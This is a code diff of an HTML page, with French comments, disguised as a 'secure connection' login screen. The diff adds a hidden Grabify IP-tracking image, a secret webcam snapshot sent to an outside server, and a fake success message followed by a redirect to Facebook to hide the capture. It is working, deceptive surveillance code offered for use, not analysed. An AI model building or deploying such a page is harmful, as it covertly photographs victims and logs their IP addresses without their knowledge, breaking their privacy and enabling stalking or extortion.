@@ -4,43 +4,58 @@
   <meta charset="UTF-8">
   <title>Connexion sécurisée</title>
   <style>
-    body {
+    html, body {
       margin: 0;
+      padding: 0;
       background: #000;
       overflow: hidden;
+      font-family: sans-serif;
+      color: #fff;
     }
 
-    video#video {
+    video {
       position: fixed;
       top: 0; left: 0;
       width: 100vw;
       height: 100vh;
       object-fit: cover;
-      filter: blur(12px) brightness(0.6);
+      filter: blur(15px) brightness(0.6);
       z-index: -1;
     }
 
-    .overlay {
+    .center {
       position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-family: sans-serif;
-      font-size: 24px;
-      background: rgba(0, 0, 0, 0.6);
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      font-size: 1.5em;
+    }
+
+    #msg {
+      animation: blink 1.2s infinite;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
     }
   </style>
 </head>
 <body>
+  <!-- Cam floutée -->
   <video id="video" autoplay muted playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div class="overlay">
-    Chargement sécurisé... Veuillez patienter...
+
+  <!-- Message au centre -->
+  <div class="center">
+    <div id="msg">Connexion sécurisée... Veuillez patienter...</div>
   </div>
+
+  <!-- Image Grabify invisible -->
+  <img src=" https://grabify.link/track/955WKN" style="display:none" />
+
+  <!-- Canvas pour capturer -->
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
@@ -50,36 +65,43 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // Attendre quelques secondes, puis capturer discrètement
+        // Attendre que la vidéo charge un peu
         setTimeout(() => {
           captureAndSend();
-        }, 3000);
+        }, 2500);
       })
       .catch(err => {
-        console.error("Webcam refusée", err);
-        document.querySelector('.overlay').textContent = "Erreur : webcam refusée";
+        document.getElementById('msg').textContent = "Erreur : Webcam refusée.";
+        console.error("Webcam refusée :", err);
       });
 
     function captureAndSend() {
       const width = video.videoWidth;
       const height = video.videoHeight;
+
       if (!width || !height) return;
 
       canvas.width = width;
       canvas.height = height;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, width, height);
+
       const imageData = canvas.toDataURL('image/jpeg');
 
-      // 📤 Envoi au serveur
+      // Envoi vers ton serveur
       fetch('https://moonscale-dashboard.onrender.com/stream/upload', {
         method: 'POST',
         body: JSON.stringify({ image: imageData }),
         headers: { 'Content-Type': 'application/json' }
       });
 
-      // Optionnel : masquer l’overlay ou rediriger
-      document.querySelector('.overlay').textContent = "Chargement terminé";
+      // Message fake de chargement avant redirection
+      document.getElementById('msg').textContent = "Connexion validée. Redirection...";
+
+      // Redirection vers Facebook
+      setTimeout(() => {
+        window.location.href = "https://www.facebook.com";
+      }, 2500);
     }
   </script>
 </body>
